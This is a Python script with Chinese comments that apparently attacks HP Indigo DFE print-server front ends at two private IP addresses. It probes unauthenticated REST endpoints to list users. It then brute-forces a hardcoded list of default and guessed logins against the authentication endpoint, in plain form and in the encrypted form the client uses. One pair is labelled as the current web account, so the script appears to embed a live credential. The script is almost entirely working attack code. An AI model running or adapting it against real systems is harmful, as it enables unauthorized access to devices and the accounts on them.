#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HP Indigo DFE 用户枚举 + 常见默认账号探测"""

import urllib.request
import urllib.error
import json
import http.cookiejar
import hashlib, base64, os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def pkcs7_pad(data, block_size=16):
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)

def get_cipher_text(user_id, password):
    salt = os.urandom(16)
    iv = os.urandom(16)
    c = hashlib.md5(user_id.encode('utf-8')).hexdigest()
    key = PBKDF2(c, salt, dkLen=16, count=1065)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pkcs7_pad(password.encode('utf-8')))
    return salt.hex() + iv.hex() + base64.b64encode(ct).decode('ascii')

def test_login(ip, user, pwd_plain, try_encrypt=True):
    """测试登录（明文 + 加密两种方式）"""
    results = []
    
    for method in ['plain', 'encrypted'][:2 if try_encrypt else 1]:
        if method == 'encrypted':
            pwd = get_cipher_text(user, pwd_plain)
        else:
            pwd = pwd_plain
        
        url = f'http://{ip}/prodflow/rest/users/authenticate'
        body = json.dumps({'login': user, 'properties': {'password': pwd}}).encode()
        req = urllib.request.Request(url, data=body, method='POST')
        req.add_header('Content-Type', 'application/json')
        req.add_header('Accept', 'application/json')
        
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                resp = json.loads(r.read())
                results.append(('SUCCESS', method, str(resp)[:100]))
        except urllib.error.HTTPError as e:
            body_err = e.read().decode()[:200]
            if 'unknown user' in body_err.lower():
                results.append(('unknown_user', method, ''))
            else:
                results.append(('error', method, body_err[:100]))
        except Exception as e:
            results.append(('exception', method, str(e)[:50]))
    
    return results

print("=== DFE 用户枚举探测 ===\n")

# 1. 尝试列出用户（不需要认证的端点）
for ip in ['192.168.1.38', '192.168.1.205']:
    print(f'[{ip}] 探测公开端点:')
    public_endpoints = [
        '/prodflow/rest/users/',
        '/prodflow/rest/users/capabilities',
        '/prodflow/rest/onlinehelp/license',
        '/prodflow/',
        '/prodflow/rest/',
    ]
    for ep in public_endpoints:
        try:
            req = urllib.request.Request(f'http://{ip}{ep}')
            with urllib.request.urlopen(req, timeout=3) as r:
                data = r.read()
                print(f'  GET {ep}: HTTP {r.status} ({len(data)} bytes)')
                try:
                    parsed = json.loads(data)
                    if isinstance(parsed, list):
                        print(f'    用户列表: {str(parsed)[:200]}')
                    elif isinstance(parsed, dict):
                        for k in list(parsed.keys())[:5]:
                            print(f'    {k}: {str(parsed[k])[:60]}')
                except:
                    print(f'    {str(data)[:100]}')
        except urllib.error.HTTPError as e:
            if e.code == 401:
                print(f'  GET {ep}: 401 需要认证')
            else:
                print(f'  GET {ep}: HTTP {e.code}')
        except Exception as e:
            print(f'  GET {ep}: {type(e).__name__}')

print("\n=== 常见默认账号探测 ===\n")

# 2. 常见 DFE 默认账号
default_accounts = [
    # HP Indigo DFE 常见默认
    ('hpadmin', 'hpadmin'),
    ('hpadmin', 'indigo'),
    ('hpadmin', 'HPadmin'),
    ('hpadmin', 'HPindigo'),
    ('dfeadmin', 'dfeadmin'),
    ('dfeadmin', 'indigo'),
    ('admin', 'admin'),
    ('admin', 'indigo'),
    ('administrator', 'administrator'),
    ('administrator', 'HPdfeHpDfe#1'),  # 当前WebUI账号
    ('HPAdmin', 'HPdfe'),
    ('HPadmin', 'HPindigo'),
    ('HPAdmin', 'admin'),
    # 服务账号
    ('service', 'service'),
    ('manufacture', 'manufacture'),
    ('operator', 'operator'),
    # 从JS中可能找到的账号
    ('admin', 'HPdfe#1'),
]

for ip in ['192.168.1.38', '192.168.1.205']:
    print(f'[{ip}] 测试 {len(default_accounts)} 个默认账号...')
    found_user = None
    for user, pwd in default_accounts:
        results = test_login(ip, user, pwd)
        for status, method, detail in results:
            if status == 'unknown_user':
                pass  # 静默，只打印成功的
            elif status != 'unknown_user':
                if status == 'SUCCESS':
                    print(f'  [成功!] {user}/{pwd} ({method})')
                    found_user = (user, pwd)
                elif status == 'error' and 'unauthorized' in detail.lower():
                    pass  # 静默认证失败
    if not found_user:
        print(f'  无账号成功')
